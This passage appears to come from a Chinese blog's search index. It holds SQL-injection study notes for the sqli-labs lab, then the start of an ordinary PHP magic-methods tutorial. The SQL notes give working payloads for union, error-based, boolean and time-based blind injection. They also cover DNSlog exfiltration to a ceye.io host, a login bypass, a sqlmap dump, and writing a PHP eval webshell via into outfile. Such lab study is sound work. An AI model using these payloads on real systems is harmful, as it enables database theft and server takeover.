'it'); 1select * from user; 查看表 123alter table user add salary decimal(8,2);#增加一列 第一个数字 8 表示 总位数（整数部分 + 小数部分的总长度不能超过 8 位）。 第二个数字 2 表示 小数部分的位数（固定保留 2 位小数，例如 12345.67 是合法的，123456.78 则超过总位数限制）。 12345增加一行INSERT INTO user (id, name, sex, birthday, job)VALUES (10, 'xiaohong', 'female', '2006-03-15', 'designer');update user set salary=5000;#将所有salary值设置为5000 123update user set name='benben' where id=1;#将id=1的行name修改为benben 123update user set name='benben2',salary=6000 where id=1;#修改id=1的行name为benben2,工资为6000 123456789alter table user drop salary;#删除salary列delete from user where job='it';#删除某一行delete from user;#删除user表 数据库查询1234567891011121314INSERT INTO user ( id, name, sex, birthday, job) VALUES (2, 'dazhuang', 'male', '2005-12-24', 'it'), (3, 'shapingba', 'male', '2005-12-24', 'it'), (4, 'ciqikou', 'male', '2005-12-24', 'it'), (5, 'hongyadong', 'male', '2005-12-24', 'it'), (6, 'yikeshu', 'male', '2005-12-24', 'it'), (7, 'jiangbeizui', 'male', '2005-12-24', 'it'), (8, 'admin', 'male', '2005-12-24', 'it'), (9, 'admin1', 'male', '2005-12-24', 'it');#再加多行 123select * from user where id=1;#select+列名(*代表所有)from+表名 where+条件语句 1234567select * from user where id in ('3');#从user表查询所有id为3,和上面一样的效果select * from user where id=(select id from user where name=('admin'));#子查询，优先查询括号里面的#一般用在不知道id只知道name为admin的查询 1234567select id from user union select email_id from emailsselect from user where id=6 union select from emails where id=6;#ERROR:have a different number of columns联合注入前后表格列数必须相等select * from users where id=6 union select *,3 from emails where id=6;#3为填充列 emails 表本身只有 2 个字段，SELECT * FROM emails... 会返回 2 个字段。但语句中用 SELECT *, 3 ... 额外添加了一个固定值 3（作为第 3 个 “虚拟字段”），使得第二个查询的结果变成了 3 个字段（2 个来自 emails 表，1 个固定值）。字段必须相同 创建emails数据表 1234CREATE TABLE emails( id int, email_id varchar(40)); 插入数据 1234567891011INSERT INTO emails ( id, email_id) VALUES (1,'Dumb@dhakkan.com'), (2,'Angel@iloveu.com'), (3,'Dummy@dhakkan.Jocal'), (4,'secure@dhakkan.local'), (5,'stupid@dhakkan.local'), (6,'superman@dhakkan.local'), (7,'batman@dhakkan.local'), (8,'admin@dhakkan.com'); 1234567891011INSERT INTO user ( id, name, sex, birthday, job) VALUES (2, 'dazhuang', 'male', '2005-12-24', 'it'), (3, 'shapingba', 'male', '2005-12-24', 'it'), (4, 'ciqikou', 'male', '2005-12-24', 'it'), (5, 'hongyadong', 'male', '2005-12-24', 'it'), (6, 'yikeshu', 'male', '2005-12-24', 'it'), (7, 'jiangbeizui', 'male', '2005-12-24', 'it'), (8, 'admin', 'male', '2005-12-24', 'it'), (9, 'admin1', 'male', '2005-12-24', 'it'); group by对所有进行分组users表如果两个人名字相同，id不一样没问题，但是要是对大量分组就会容易报错 12345678select department,count(id) from student group by department;#查询department院系人数 count(id)对ID进行计数#一般用于二分法判断数据表列数select * from users where id=9 group by 2;#by2,4,8~~~依次排查到报错为止，从而确定列数；group by是按多少列排序select * from users where id=9 group by 4;select * from users order by 1; 按升序排序，第一列 12345select stu_id from score where c_name='计算机' order by grade desc;#grade参数desc使排列顺序变为降序#查询 “计算机” 这门课程的所有学生的学号，并按成绩从高到低排序select * from users limit 1,2; 上面应该是 1select * from users limit 0,2; 与和或 1234#两个条件需要同时满足select * from users where id=1 and username='benben';#两个条件有一个满足select * from users where id=1 or username='benben'; or在post提交里面做万能密码判断字符型还是数字型 group_concat 多行合并变一行 1select group_concat(id,username,password)from users; 把所有写到的类全合并 1select database() 查看当前数据库名称 1select version() 查看当前数据库的版本，防火墙绕过可以用到，例如什么注释符绕过 查看当前权限 1show grants; union注入1.了解union注入过程中用到的关键数据库、数据表、数据列2.sql查询中group_concat的作用 最终目标使用union注入拿到靶机中数据库里的所有用户名和密码。 拿到表名，列名 1.提前了解 1?id=1' union select 1,2,3--+ 回显位是2，3查数据库是security 1?id=1' union select 1,2,database()--+ 然后查数据表 1?id=-1' union select 1,2,table_name from information_schema.tables --+ 仅属于当前数据库的表 1?id=-1' union select 1,2,table_name from information_schema.tables where table_schema=database() --+ 这里只能显示一个表名，那么我们需要一个group_concat 1?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ 这里查到了所有数据表 紧接着就是列名 1?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns --+ 里面很多没啥用的，我们就看一个数据表的列名 1?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' --+ 查当前数据库中 users 表的所有字段名（列名） 然后查最终目标 12345?id=-1' union select 1,2,group_concat(username,password) from users --+或者?id=-1' union select 1,group_concat(username,password),3 from users --+ 小技巧，看起来不方便科如下操作 1?id=-1' union select 1,2,group_concat(username,&quot;~&quot;,password) from users --+ 数字型union注入数字型不需要判断闭合方式 1.确定数字型还是字符型2.使用group by的二分法判断union语句中前一个查询的列数3.优化语句，将d改为一个不存在的数字4.使用select语句，查询靶机数据库库名5.使用select语句，查询靶机所有表名6.使用select语句，查询靶机所有列名7.查询所有用户名密码 less-2判断是数字型注入用2-1 和1去比较，相同就是数字型 这里就不用去闭合了我们接着去判断列数，这里用order by判断是3列接着联合注入，记得要改成-1不然只会回显第一行 `` Post unionPOST提交和GET提交POST提交的使用HackBarPOST提交注入POST提交报错注入 POST提交和GET提交1.get提交可以被缓存，post提交不会2.get提交参数会保留在浏览器的历史记录里，post提交不会3.get提交可以被收藏为书签，post提交不会4.get提交有长度限制，最长2048个字符；post提交没有长度要求，不是只允许使用ASCII字符，还可以使用二进制数据有可能溢出绕过，waf防火墙只检查前面多少个数据，9000多个 post提交比get提交更安全 下面这个url在浏览器里面就是get提交被缓存 less-11源代码 1@$sql=&quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1&quot;; 下面这是username万能密钥 1admin' or 1=1 # 代到上面的语句中就是 1@$sql=&quot;SELECT username, password FROM users WHERE username='admin' or 1=1 #' and password='$passwd' LIMIT 0,1&quot;; #把后面全注释掉了， 利用参数化查询避免SQL注入漏洞 post查数据库 1uname='union select 1,(select database()) #&amp;passwd=123&amp;Submit=Submit 判断列数 1uname=admin'group by 2#&amp;passwd=123&amp;submit=Submit post提交查字段 1uname='union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users')#&amp;passwd=123&amp;Submit=Submit 查数据 1uname='union select 1,(select group_concat(username,&quot;:&quot;,password) from users)#&amp;passwd=123&amp;Submit=Submit 报错注入extractvalue什么是报错注入 构造语句，让错误信息中夹杂可以显示数据库内容的查询语句返回报错提示中包含数据库中的内容 ===1.通过floor()报错注入===*2.通过extractValue()报错注入**3.通过updateXml()报错注入*4.通过NAME_CONST()报错注入5.通过jion()报错注入6.通过exp()报错注入7.通过geometryCollection()报错注入8.通过polygon()报错注入9.通过multipoint()报错注入10.通过multlinestring()报错注入11.通过multpolygon()报错注入12.通过linestring()报错注入 先创建两个数据库 1234567891011121314151617181920212223242526272829303132create database ctfstu charset utf8;create table xml(doc varchar(150));insert into xml values('&lt;book&gt;&lt;title&gt;how to become a bad boy&lt;/title&gt;&lt;author&gt;&lt;initial&gt;hualong&lt;/initial&gt;&lt;surname&gt;Melton&lt;/surname&gt;&lt;/author&gt;&lt;/book&gt;');insert into xml values('&lt;book&gt;&lt;title&gt;A bad boy how to get agirlfriend&lt;/title&gt;&lt;author&gt;&lt;initial&gt;Love&lt;/initial&gt;&lt;surname&gt;benben&lt;/surname&gt;&lt;/author&gt;&lt;/book&gt;');select extractvalue(doc,'/book/author/surname')from xml; doc是列名，第二个是查询路径,查到的是benben 12345678&lt;book&gt; &lt;title&gt;A bad boy how to get a girlfriend&lt;/title&gt; &lt;author&gt; &lt;initial&gt;Love&lt;/initial&gt; &lt;surname&gt;benben&lt;/surname&gt; &lt;/author&gt; &lt;/book&gt;select extractvalue(doc,'~book/author/surname')from xml; 上面这个报错是有回显语句的，所以我们可以在报错前构造一个查询语句 1select extractvalue(doc,concat(0x7e,(select database()))) from xml; 上述是显示当前库名 less-5尝试构造以下语句 1?id=-1' union select 1,2,database() --+ 尝试故意写错database 1?id=-1' union select 1,2,datdbase() --+ 出现如下报错可以知道当前数据库的库名是security 1234?id=100' union select 1,extractvalue(1,concat(0x7e,(select database()))),3--+#0x7e就是~号extractvalue这里列可以随便写，为的就是报错 上述语句也可以查到库名是security 1?id=100' and 1=extractvalue(1,concat(0x7e,(select database()))) --+ 然后查表名 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),3--+ 查到当前数据库表名继续查列名 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))) ,3--+ 最后查数据 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users))) ,3--+ 报错注入一次只能返回32个字符，所以此时要用substringsubstring(“第一”,”第二·”,”第三”) 第一：就是字符第二：从哪一位开始显示第三：显示总共多少位字符如下所示 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select substring(group_concat(id,username,password),1,3) from users))) ,3--+ floor报错注入涉及到函数较多 rand()函数：随机返回0-1之间的小数floor()函数：小数向下取整，向上取整数ceiling()concat_ws()函数：将括号内数据用第一个字段连接起来group by:分组as:别名count()函数:汇总统计数量limit:这里用于显示指定行数 1234567891011121314151617181920212223?id=0' union select 1,count(*),concat_ws('-',(select concat('~',id,username,':',password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a --+select rand() #随机生成0-1select rand() #随机生成0-2select rand() from users #有多少行生成多少个随机数select floor(rand()*2); #随机0或者1，只有两个结果select concat_ws('-',2,3) #2-3,拼接select concat_ws('-',(select database()),floor(rand()*2)) #数据库名字-0/1select concat_ws('-',(select database()),floor(rand()*2)) as a from users group by a; #分组select count(*), concat_ws(&quot;~&quot;, (select database()), floor(rand()*2)) as a from users group by a; #执行不是每次报错select count(*), concat_ws(&quot;~&quot;, (select database()), floor(rand(0)*2)) as a from users group by a; #rand()改成rand(0)就会固定报错，改成1就会不报错select count(*),concat_ws('-',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)) as a from users group by a;#输出库名?id=-1' union select 1, count(*), concat_ws('-', (select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1), floor(rand(0)*2)) as a from users group by a --+#获取表名less-5?id=-1' union select 1, count(*), concat_ws('-', (select group_concat(username,':',password) from users), floor(rand(0)*2)) as a from users group by a --+#group_concat无法显示，可以使用concat?id=-1' union select 1, count(*), concat_ws('-', (select concat(username,':',password) from users limit 0,1), floor(rand(0)*2)) as a from users group by a --+#查最终数据 这是分组 查最终数据 updatexml注入函数updatexml(XML_document,XPath_string,new_value)包含三个参数第一个参数：XML document是string格式，为XML文档对象的名称，例如Doc第二个参数：XPath string是路径，XPath:格式的字符串第三个参数：new_value,string格式，替换查找到的符合条件的数据 updatexml 正常句式 1select updatexml(doc,'/book/auther/surname','1') from xml; 错误句式 1select updatexml(doc,'~book/auther/surname','1') from xml; 查数据库，第二个参数会引起报错，从而回显数据库名字 1?id=1&quot; and 1=updatexml(1,concat('~',(select database())),3) --+ 查数据表 1?id=1&quot; and 1=updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) --+ 查列 1?id=1&quot; and 1=updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')),3) --+ 然后查到这些个列名，最后查数据 1?id=1&quot; and 1=updatexml(1,concat('~',(select group_concat(id,username,password) from users)),3) --+ 这个限制长度了，用substring修改以下 1?id=1&quot; and 1=updatexml(1,concat('~',substring((select group_concat(id,username,password) from users),1,30)),3) --+ 盲注布尔盲注盲注：页面没有报错回显位，不知道数据库具体返回值的情况下，对数据库内容进行猜解，实行SQL注入 盲注分类：布尔盲注，时间盲注，报错注入 布尔盲注：web页面只返回True真，Flase假两种类型。利用页面返回不同，逐个猜解数据 用如下语句判断是否是布尔盲注 1?id=1' and 1=1 --+ 回复为真 1?id=1' and 1=2 --+ 回复为假 手动注入找到waf 关键函数函数ascii() ascii美国信息交换标准代码，可以把字母转换成对应数字 1select ascii('A') 1234?id=1' and ascii(substr((select database()),1,1))&gt;=101 --+(select database())substr((select database()),1,1)ascii(substr((select database()),1,1)) 大于等于115可以116不行所以第一个字符就是115 第二个字符 1?id=1' and ascii(substr((select database()),2,1))&gt;=101 --+ 依次去试 1?id=1'and ascii(substr('abcd',1,1))&gt;97 --+ 把abcd替换成要查询的语句即可 查表名limit 0,1 表示获取第 1 个表名 12?id=1' and ascii(substr((select table_name from information_schema.tables wheretable_schema=database() limit 0,1),1,1))&gt;100 --+ 查列名 12?id=1' and ascii(substr((select column_name from information_schema.columns wheretable_schema=database() and table_name='users' limit 0,1),1,1))&gt;100 --+ 查数据 12?id=1' and ascii(substr((select username from users limit 0,1),1,1))&gt;100 --+?id=1' and ascii(substr((select password from users limit 0,1),1,1))&gt;100 --+ 时间盲注时间盲注：web页面只返回一个正常页面，利用页面响应时间不同逐个猜解数据 前提是数据库会执行命令代码，只是不反馈页面信息 前提是数据库会执行命令代码，只是不反馈页面信息 关键函数函数sleep() 参数为休眠时长，以秒为单位，可以为小数 1select sleep(2) less-9输入 1?id=1 他是对的然后后面随便输不会变 1?id=1 and sleep(3) --+ 如果是数字型，她会延迟3秒才显示，这里它立马就回显了，显然不是数字型 然后判断是什么闭合,可以看到单引号等了3秒才回显，说明单引号闭合 1select if(1=1,sleep(0),sleep(3)); 这句话的意思是1=1为真就执行休眠0秒 1?id=1' and if(ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(3)) --+ 比大小猜解，然后通过时间响应判断条件是否成立 最终得到数据库名字的首字母是114rd 查询表 1234?id=1' and if(ascii(substr ((table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,sleep(0),sleep(3))--+?id=1' and if(ascii(substr ((column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),1,1))&gt;100,sleep(0),sleep(3))--+?id=1'and if(ascii(substr((select username from users limit 0,1),1,1))&gt;100,sleep(0),sleep(3)) --+?id=1' and if(ascii(substr((select password from users limit 0,1),1,1))&gt;100,sleep(0),sleep(3)) --+ dnslog注入盲注的一种，sqlmap，比盲注效率要高,可以一组一组，一行一行的出来 对当前服务器读写的权限要打开如果不能做SQL注入文件上传，那么这个也做不了 1select load_file(&quot;C:\\\\benben.txt&quot;); UNC路径格式：servername\\sharename,其中servername:是服务器名。sharename是共享资源的名称。目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：\\servername\\sharename\\directory \\filename。其实我们平常在Vidnows中用共享文件的时候就会用到这种网络地址的形式sss.xxxltest 查看本地文件 先查数据库 1?id=1'and select load_file(concat(&quot;\\\\\\\\&quot;,(select database()),&quot;1.j96k1p.ceye.io\\\\1.txt&quot;))--+ 查数据表 1?id=1' and (select load_file(concat(&quot;\\\\\\\\&quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;1.j96k1p.ceye.io\\\\1&quot;)))--+ 这里limit 0，1是显示第一个表名emails 是从0开始只显示一个limit 1,1 是从1开始只显示一个 列名 1?id=1' and (select load_file(concat(&quot;\\\\\\\\&quot;,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),&quot;1.j96k1p.ceye.io\\\\1&quot;)))--+ 工具注入DnslogSqlinj 1234567891011121314151617181920Usage: dnslogSql.py [options] -u http://10.1.1.9/sqli-labs/Less-9/?id=1' and ({})--+Options: --version show program's version number and exit -h, --help show this help message and exit -n TASKNAME, --name=TASKNAME task name -t THREAD_COUNT, --thread=THREAD_COUNT thread_count -u URL, --url=URL target include injection -i INF, --inf=INF Testing target and Try to get information --dbs get database -D DB database name --tables get table -T TABLE table name --columns get column -C COLUMN column name --dump get **data**D:\\env\\Python\\Python27\\python.exe dnslogSql.py -u &quot;http://sqli:8088/Less-9/?id=1' and ({})--+&quot;D:\\env\\Python\\Python27\\python.exe dnslogSql.py -u &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1' and ({})--+&quot; -D security --tables 1sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&quot; -D security -T users -C username,password --dump --time-sec 2 sql注入文件上传文件上传拿webshell 判断mysql是否有文件读写权限 12show variables like '%secure%';#用来查看mysql是否有读写文件权限 这里NULL是没有文件读写权限的我们在mysql下面的my.ini文件里面的[mysqld]组下面加一行 1secure_file_priv=&quot;&quot; 然后就有文件读写权限了 1.show variables like’%secure%’;用来查看mysql是否有读写文件权限；2.数据库的fle权限规定了数据库用户是否有权限，向操作系统内写入和读取已存在的权限；3.into outfile命令使用的环境：必须知道一个，服务器上可以写入文件的文件夹的完整路径。 less-7两个双引号不报错的原因是因为双引号被两个单引号闭合，失去单引号的作用是如下闭合方式 1?id=1')) 有个法子可以判断到底是不是两个单引号闭合 1?id=1'' and 1=2 --+ 这显然是不成立的，但是任然不报错，可以看到那么这就不是两个单引号闭合 1?id=-1'))union select 1,&quot;&lt;?php @eval($_POST['password']);?&gt;&quot;,3 into outfile &quot;D:\\\\phpstudy_pro\\\\WWW\\\\ben.php&quot;--+ &lt;?php@eval($_POST['password]);?&gt;为一句话木马password为预留密码D:\\\\phpstudy._pro\\\\WWWW\\\\为文件路径ben.php为新插入的文件名 1?id=-1')) union select 1,&quot;&lt;?php @eval($_POST['password']);?&gt;&quot;,3 into outfile &quot;D:\\\\Soft\\\\Penetration\\\\TrafficTools\\\\phpStudy\\\\WWW\\\\ben.php&quot; --+ 这里写好注入，文件上传成功，然后用蚁剑连接这里连接地址就是 1http://localhost/ben.php 查看权限，这是本机的一个管理员用户 linux的话是 1?id=-1'))union select 1,&quot;&lt;?php @eval($_POST['password']);?&quot;,3 into outfile &quot;/var/www/heml/test/ben.php&quot;--+ 上传大马反弹拿web shell","link":"/2025/12/11/sql%E6%B3%A8%E5%85%A5/"},{"title":"","text":"PHP魔术方法 前言PHP中把以两个下划线__开头的方法称为魔术方法(Magic methods)，这些方法在PHP中充当了举足轻重的作用。 魔术方法包括： __construct()，类的构造函数 __destruct()，类的析构函数 __call()，在对象中调用一个不可访问方法时调用 __callStatic()，用静态方式中调用一个不可访问方法时调用 __get()，获得一个类的成员变量时调用 __set()，设置一个类的成员变量时调用 __isset()，当对不可访问属性调用isset()或empty()时调用 __unset()，当对不可访问属性调用unset()时被调用。 __sleep()，执行serialize()时，先会调用这个函数 __wakeup()，执行unserialize()时，先会调用这个函数 __toString()，类被当成字符串时的回应方法 __invoke()，调用函数的方式调用一个对象时的回应方法 __set_state()，调用var_export()导出类时，此静态方法会被调用。 __clone()，当对象复制完成时调用 __autoload()，尝试加载未定义的类 __debugInfo()，打印所需调试信息 范例下面让我们以实例的形式向大家讲解下这几个魔术方法时如何使用的。 一、 __construct()，类的构造函数php中构造方法是对象创建完成后第一个被对象自动调用的方法。在每个类中都有一个构造方法，如果没有显示地声明它，那么类中都会默认存在一个没有参数且内容为空的构造方法。 1、 构造方法的作用 通常构造方法被用来执行一些有用的初始化任务，如对成员属性在创建对象时赋予初始值。 2、 构造方法的在类中的声明格式 1234function __constrct([参数列表]){ 方法体 //通常用来对成员属性进行初始化赋值} 3、 在类中声明构造方法需要注意的事项 1231、在同一个类中只能声明一个构造方法，原因是，PHP不支持构造函数重载。2、构造方法名称是以两个下画线开始的__construct() 下面是它的例子： 1234567891011121314151617181920212223242526&lt;?php class Person { public $name; public $age; public $sex; /** * 显示声明一个构造方法且带参数 */ public function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=27) { $this-&gt;name = $name; $this-&gt;sex = $sex; $this-&gt;age = $age; } /** * say 方法 */ public function say() { echo &quot;我叫：&quot; . $this-&gt;name . &quot;，性别：&quot; . $this-&gt;sex . &quot;，年龄：&quot; . $this-&gt;age; } } 创建对象$Person1且不带任参数 12$Person1 = new Person();echo $Person1-&gt;say(); //输出:我叫：，性别：男，年龄：27 创建对象$Person2且带参数“小明” 12$Person2 = new Person(&quot;小明&quot;);echo $Person2-&gt;say(); //输出：我叫：张三，性别：男，年龄：27 创建对象$Person3且带三个参数 12$Person3 = new Person(&quot;李四&quot;,&quot;男&quot;,25);echo $Person3-&gt;say(); //输出：我叫：李四，性别：男，年龄：25 二、__destruct()，类的析构函数通过上面的讲解，现在我们已经知道了什么叫构造方法。那么与构造方法对应的就是析构方法。 析构方法允许在销毁一个类之前执行的一些操作或完成一些功能，比如说关闭文件、释放结果集等。 析构方法是PHP5才引进的新内容。 析造方法的声明格式与构造方法 __construct() 比较类似，也是以两个下划线开始的方法 __destruct() ，这种析构方法名称也是固定的。 1、 析构方法的声明格式 1234function __destruct(){ //方法体} 注意：析构函数不能带有任何参数。 2、 析构方法的作用 1一般来说，析构方法在PHP中并不是很常用，它属类中可选择的一部分，通常用来完成一些在对象销毁前的清理任务。 举例演示，如下： 123456789101112131415161718192021222324252627282930313233&lt;?phpclass Person{ public $name; public $age; public $sex; public function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=22) { $this-&gt;name = $name; $this-&gt;sex = $sex; $this-&gt;age = $age; } /** * say 说话方法 */ public function say() { echo &quot;我叫：&quot;.$this-&gt;name.&quot;，性别：&quot;.$this-&gt;sex.&quot;，年龄：&quot;.$this-&gt;age; } /** * 声明一个析构方法 */ public function __destruct() { echo &quot;我觉得我还可以再抢救一下，我的名字叫&quot;.$this-&gt;name; }}$Person = new Person(&quot;小明&quot;);unset($Person); //销毁上面创建的对象$Person 上面的程序运行时输出： 1我觉得我还可以再抢救一下，我的名字叫小明 三、 __call()，在对象中调用一个不可访问方法时调用。该方法有两个参数，第一个参数 $function_name 会自动接收不存在的方法名，第二个 $arguments 则以数组的方式接收不存在方法的多个参数。 1、 __call() 方法的格式： 1234function __call(string $function_name, array $arguments){ // 方法体} 2、 __call() 方法的作用： 123为了避免当调用的方法不存在时产生错误，而意外的导致程序中止，可以使用 __call() 方法来避免。该方法在调用的方法不存在时会自动调用，程序仍会继续执行下去。 请参考如下代码： 1234567891011121314151617181920212223&lt;?phpclass Person{ function say() { echo &quot;Hello, world!&lt;br&gt;&quot;; } /** * 声明此方法用来处理调用对象中不存在的方法 */ function __call($funName, $arguments) { echo &quot;你所调用的函数：&quot; . $funName . &quot;(参数：&quot; ; // 输出调用不存在的方法名 print_r($arguments); // 输出调用不存在的方法时的参数列表 echo &quot;)不存在！&lt;br&gt;\\n&quot;; // 结束换行 } }$Person = new Person(); $Person-&gt;run(&quot;teacher&quot;); // 调用对象中不存在的方法，则自动调用了对象中的__call()方法$Person-&gt;eat(&quot;小明&quot;, &quot;苹果&quot;); $Person-&gt;say(); 运行结果： 12345你所调用的函数：run(参数：Array ( [0] =&gt; teacher ) )不存在！你所调用的函数：eat(参数：Array ( [0] =&gt; 小明 [1] =&gt; 苹果 ) )不存在！Hello, world! 四、 __callStatic()，用静态方式中调用一个不可访问方法时调用此方法与上面所说的 __call() 功能除了 __callStatic() 是未静态方法准备的之外，其它都是一样的。 请看下面代码： 1234567891011121314151617181920212223&lt;?phpclass Person{ function say() { echo &quot;Hello, world!&lt;br&gt;&quot;; } /** * 声明此方法用来处理调用对象中不存在的方法 */ public static function __callStatic($funName, $arguments) { echo &quot;你所调用的静态方法：&quot; . $funName . &quot;(参数：&quot; ; // 输出调用不存在的方法名 print_r($arguments); // 输出调用不存在的方法时的参数列表 echo &quot;)不存在！&lt;br&gt;\\n&quot;; // 结束换行 }}$Person = new Person();$Person::run(&quot;teacher&quot;); // 调用对象中不存在的方法，则自动调用了对象中的__call()方法$Person::eat(&quot;小明&quot;, &quot;苹果&quot;);$Person-&gt;say(); 运行结果如下： 123你所调用的静态方法：run(参数：Array ( [0] =&gt; teacher ) )不存在！你所调用的静态方法：eat(参数：Array ( [0] =&gt; 小明 [1] =&gt; 苹果 ) )不存在！Hello, world! 五、 __get()，获得一个类的成员变量时调用在 php 面向对象编程中，类的成员属性被设定为 private 后，如果我们试图在外面调用它则会出现“不能访问某个私有属性”的错误。那么为了解决这个问题，我们可以使用魔术方法 __get()。 魔术方法__get()的作用 1在程序运行过程中，通过它可以在对象的外部获取私有成员属性的值。 我们通过下面的 __get() 的实例来更进一步的连接它吧： 12345678910111213141516171819202122232425262728293031323334&lt;?phpclass Person{ private $name; private $age; function __construct($name=&quot;&quot;, $age=1) { $this-&gt;name = $name; $this-&gt;age = $age; } /** * 在类中添加__get()方法，在直接获取属性值时自动调用一次，以属性名作为参数传入并处理 * @param $propertyName * * @return int */ public function __get($propertyName) { if ($propertyName == &quot;age&quot;) { if ($this-&gt;age &gt; 30) { return $this-&gt;age - 10; } else { return $this-&gt;$propertyName; } } else { return $this-&gt;$propertyName; } }}$Person = new Person(&quot;小明&quot;, 60); // 通过Person类实例化的对象，并通过构造方法为属性赋初值echo &quot;姓名：&quot; . $Person-&gt;name . &quot;&lt;br&gt;&quot;; // 直接访问私有属性name，自动调用了__get()方法可以间接获取echo &quot;年龄：&quot; . $Person-&gt;age . &quot;&lt;br&gt;&quot;; // 自动调用了__get()方法，根据对象本身的情况会返回不同的值 运行结果： 12姓名：小明年龄：50 六、 __set()，设置一个类的成员变量时调用 __set() 的作用： __set( value )` 方法用来设置私有属性， 给一个未定义的属性赋值时，此方法会被触发，传递的参数是被设置的属性名和值。 请看下面的演示代码： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpclass Person{ private $name; private $age; public function __construct($name=&quot;&quot;, $age=25) { $this-&gt;name = $name; $this-&gt;age = $age; } /** * 声明魔术方法需要两个参数，真接为私有属性赋值时自动调用，并可以屏蔽一些非法赋值 * @param $property * @param $value */ public function __set($property, $value) { if ($property==&quot;age&quot;) { if ($value &gt; 150 || $value &lt; 0) { return; } } $this-&gt;$property = $value; } /** * 在类中声明说话的方法，将所有的私有属性说出 */ public function say(){ echo &quot;我叫&quot;.$this-&gt;name.&quot;，今年&quot;.$this-&gt;age.&quot;岁了&quot;; }}$Person=new Person(&quot;小明&quot;, 25); //注意，初始值将被下面所改变//自动调用了__set()函数，将属性名name传给第一个参数，将属性值”李四”传给第二个参数$Person-&gt;name = &quot;小红&quot;; //赋值成功。如果没有__set()，则出错。//自动调用了__set()函数，将属性名age传给第一个参数，将属性值26传给第二个参数$Person-&gt;age = 16; //赋值成功$Person-&gt;age = 160; //160是一个非法值，赋值失效$Person-&gt;say(); //输出：我叫小红，今年16岁了 运行结果： 1我叫小红，今年16岁了 七、 __isset()，当对不可访问属性调用isset()或empty()时调用在看这个方法之前我们看一下isset()函数的应用，isset()是测定变量是否设定用的函数，传入一个变量作为参数，如果传入的变量存在则传回true，否则传回false。 那么如果在一个对象外面使用isset()这个函数去测定对象里面的成员是否被设定可不可以用它呢？ 分两种情况，如果对象里面成员是公有的，我们就可以使用这个函数来测定成员属性，如果是私有的成员属性，这个函数就不起作用了，原因就是因为私有的被封装了，在外部不可见。那么我们就不可以在对象的外部使用isset()函数来测定私有成员属性是否被设定了呢？当然是可以的，但不是一成不变。你只要在类里面加上一个__isset()方法就可以了，当在类外部使用isset()函数来测定对象里面的私有成员是否被设定时，就会自动调用类里面的__isset()方法了帮我们完成这样的操作。 __isset()的作用：当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。 请看下面代码演示： 1234567891011121314151617181920212223242526272829&lt;?phpclass Person{ public $sex; private $name; private $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } /** * @param $content * * @return bool */ public function __isset($content) { echo &quot;当在类外部使用isset()函数测定私有成员{$content}时，自动调用&lt;br&gt;&quot;; echo isset($this-&gt;$content); }}$person = new Person(&quot;小明&quot;, 25); // 初始赋值echo isset($person-&gt;sex),&quot;&lt;br&gt;&quot;;echo isset($person-&gt;name),&quot;&lt;br&gt;&quot;;echo isset($person-&gt;age),&quot;&lt;br&gt;&quot;; 运行结果如下： 123451 // public 可以 isset()当在类外部使用isset()函数测定私有成员name时，自动调用 // __isset() 内 第一个echo1 // __isset() 内第二个echo当在类外部使用isset()函数测定私有成员age时，自动调用 // __isset() 内 第一个echo1 // __isset() 内第二个echo 八、 __unset()，当对不可访问属性调用unset()时被调用。看这个方法之前呢，我们也先来看一下 unset() 函数，unset()这个函数的作用是删除指定的变量且传回true，参数为要删除的变量。 那么如果在一个对象外部去删除对象内部的成员属性用unset()函数可以吗？ 这里自然也是分两种情况： 1、 如果一个对象里面的成员属性是公有的，就可以使用这个函数在对象外面删除对象的公有属性。 2、 如果对象的成员属性是私有的，我使用这个函数就没有权限去删除。 虽然有以上两种情况，但我想说的是同样如果你在一个对象里面加上__unset()这个方法，就可以在对象的外部去删除对象的私有成员属性了。在对象里面加上了__unset()这个方法之后，在对象外部使用“unset()”函数删除对象内部的私有成员属性时，对象会自动调用__unset()函数来帮我们删除对象内部的私有成员属性。 请看如下代码： 1234567891011121314151617181920212223242526272829&lt;?phpclass Person{ public $sex; private $name; private $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } /** * @param $content * * @return bool */ public function __unset($content) { echo &quot;当在类外部使用unset()函数来删除私有成员时自动调用的&lt;br&gt;&quot;; echo isset($this-&gt;$content); }}$person = new Person(&quot;小明&quot;, 25); // 初始赋值unset($person-&gt;sex);unset($person-&gt;name);unset($person-&gt;age); 运行结果： 123当在类外部使用unset()函数来删除私有成员时自动调用的1当在类外部使用unset()函数来删除私有成员时自动调用的1 九、 __sleep()，执行serialize()时，先会调用这个函数serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，则该方法会优先被调用，然后才执行序列化操作。 